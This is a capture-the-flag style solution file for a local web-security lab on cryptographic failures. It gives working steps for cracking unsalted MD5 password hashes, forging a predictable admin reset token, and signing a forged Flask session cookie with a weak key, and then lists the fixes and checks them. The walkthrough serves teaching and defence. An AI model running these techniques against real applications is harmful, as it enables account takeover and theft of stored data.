🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)

# A04 — Solution (spoilers!)

Try the lab yourself first, using the hints from the [README](./README.md).

## 1. How the data is stored (vulnerable, port 8031)

```bash
curl -s http://127.0.0.1:8031/_lab/dump > dump.json
```

- `password_hash`: 32 hex characters, which means **unsalted MD5**
- `cards.number`: full card numbers in **plain text**

## 2. Guessing passwords with a dictionary

MD5 is computed instantly, and without a salt identical passwords give identical hashes, so they can be compared against a dictionary (run it from the lab folder):

```bash
python3 - <<'EOF'
import hashlib, json
dump = json.load(open("dump.json"))
words = [w.strip() for w in open("wordlist.txt") if w.strip()]
for user in dump["users"]:
    for word in words:
        if hashlib.md5(word.encode()).hexdigest() == user["password_hash"]:
            print(user["username"], "->", word)
EOF
# alice -> sunshine
# bob   -> qwerty
```

The `admin` password is not in the dictionary, so it cannot be guessed this way. But there are other paths.

## 3. Admin through a predictable reset token

```bash
# Request a reset for yourself and look at the "email"
curl -H 'Content-Type: application/json' -d '{"username":"alice"}' http://127.0.0.1:8031/reset-request
curl http://127.0.0.1:8031/_lab/outbox
# a link like /reset/<32 hex characters>

# Compare the token with the MD5 of the name
echo -n alice | md5sum        # matches the token

# So the admin's token is computed the same way
TOKEN=$(echo -n admin | md5sum | cut -d' ' -f1)
curl -H 'Content-Type: application/json' -d '{"new_password":"hacked123"}' http://127.0.0.1:8031/reset/$TOKEN

# Log in as admin and look at the flag
curl -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"hacked123"}' http://127.0.0.1:8031/login
curl -b jar.txt http://127.0.0.1:8031/me     # FLAG{a04_admin_takeover}
```

## 4. Admin through a forged cookie

The session signing key in the code is `secret`, and such weak keys can be guessed with a dictionary. Knowing the key, you can sign any session:

```bash
pip install Flask
python3 - <<'EOF'
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
app = Flask("x")
app.secret_key = "secret"
print(SecureCookieSessionInterface().get_signing_serializer(app).dumps({"user": "admin"}))
EOF

curl --cookie "session=<value from the output>" http://127.0.0.1:8031/me   # FLAG{a04_admin_takeover}
```

## 5. Card numbers

`GET /cards` returns the full card number to a logged-in user, and in the "leaked" database it is stored in plain text.

## Fixes (fixed, port 8032)

| Problem | Fix |
|---------|-----|
| Unsalted MD5 | `generate_password_hash` (scrypt with a unique salt) |
| Token = MD5(name) | `secrets.token_urlsafe(32)`, only the SHA-256 of the token is stored, 15-minute lifetime, single-use |
| Session key `secret` | The key comes from `SECRET_KEY` or is random (`secrets.token_hex(32)`), the cookie has `HttpOnly` and `SameSite` |
| Cards in plain text | Fernet (AES) encryption before writing, the key comes from `DATA_ENCRYPTION_KEY`; the response contains only the mask `**** **** **** 1111` |
| Weak passwords at registration | Minimum length of 8 characters |

Check on fixed:

```bash
curl -s http://127.0.0.1:8032/_lab/dump      # scrypt:... hashes, cards as gAAAA...
# the predicted admin token is rejected
curl -H 'Content-Type: application/json' -d '{"new_password":"hacked12345"}' \
  http://127.0.0.1:8032/reset/$(echo -n admin | md5sum | cut -d' ' -f1)      # 400
```

A forged cookie signed with the key `secret` is not accepted: the signature does not match.

## What else to remember
- Encryption without protecting the key is pointless: the key must be stored separately from the data (a secrets manager, environment variables).
- In the lab, if the environment variables are missing, the keys are created anew on every start. That is unacceptable for a real system: after a restart the old data could not be decrypted.
- `/_lab/dump` and `/_lab/outbox` are not protected: this is a learning imitation. Real applications must not have such endpoints.
